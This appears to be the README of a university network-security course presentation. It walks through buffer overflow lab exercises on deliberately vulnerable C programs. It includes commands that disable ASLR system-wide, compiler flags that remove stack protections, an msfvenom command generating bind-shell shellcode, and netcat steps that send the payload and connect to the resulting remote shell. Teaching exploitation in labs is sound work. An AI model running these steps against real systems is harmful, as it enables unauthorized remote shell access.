# NetworkSecurityPresentation
Presentation for the NetSec course based on Buffer overflow exploit

# Requisite
    
## disable memory randomization, enable core dumps
```bash
    cat /proc/sys/kernel/randomize_va_space
    sudo bash -c 'echo "kernel.randomize_va_space = 0" >> /etc/sysctl.conf'
    sudo sysctl -p
    cat /proc/sys/kernel/randomize_va_space
    # verify "0"
    ulimit -c unlimited
    ulimit -c
    # verify "unlimited"
```
# Test Exercise

This test exercise is used to explain how memory works and how data is managed into the stack.

## Compilation
```bash
    cd /path/to/repo/src/ex0
    gcc -O0 -m32 -z execstack -fno-stack-protector -mpreferred-stack-boundary=2 -g exercise0.c -o exercise0
```

## Execution
```bash
    cd /path/to/repo/src/ex0
    gdb exercise0
```
# First Exercise

The first exercise consists in overwrite a variable used to grant permission to a user using the `strcpy()` vulnerable function

## Compilation
```bash
    cd /path/to/repo/src/ex1
    gcc -O0 -m32 -z execstack -fno-stack-protector -mpreferred-stack-boundary=2 -g exercise1.c -o exercise1
```

## Execution
```bash
    cd /path/to/repo/src/ex1
    ./exercise1 input
```
# Second Exercise

The second exercise consists in overwrite the `RET` address of the stack in order to redirect the program to a chosen function using the `strcpy()` vulnerable function and the `gdb` debugger in order to find out the right number of junk chars to fill up the stack

## Compilation
```bash
    cd /path/to/repo/src/ex2
    gcc -O0 -m32 -z execstack -fno-stack-protector -mpreferred-stack-boundary=2 -g exercise2.c -o exercise2
```

## Find out the function register
```bash
    cd /path/to/repo/src/ex2
    objdump -d exercise2 | grep <function_name>
```
## Execution
```bash
    cd /path/to/repo/src/ex2
    ./exercise2 $(python2 -c 'print"A"*<num_char> + "function register"')
```
    keep in mind that the intel cpu are Little Endian so pay attention when insert the register
# Third Exercise
The third exercise consists in overwrite the `RET` address of the stack and fill up the buffer with a shellcode in order to spawn a remote shell possibly with root privileges
## Compilation server
```bash
    cd /path/to/repo/src/ex3
    gcc -O0 -m32 -z execstack -fno-stack-protector -mpreferred-stack-boundary=2 -g exercise3_server.c -o exercise3_server
```

## Create a shellcode using msfvenom
```bash
    msfvenom -p linux/x86/shell_bind_tcp AppendExit=true -e x86/alpha_mixed -f python
```
## Execution server
```bash
    cd /path/to/repo/src/ex3
    ./exercise3_server
```

## Execution Client
```bash
    use one of the ex3-client file to generate a malicious string
    ./ex3-client*.py > string
    nc <server_port> 4001 < string 
    to generate the malicious string use the buffer output of the previous command and the %eip register found using the debugger

    nc <server_port> 4444 
    here's your remote shell :)
```
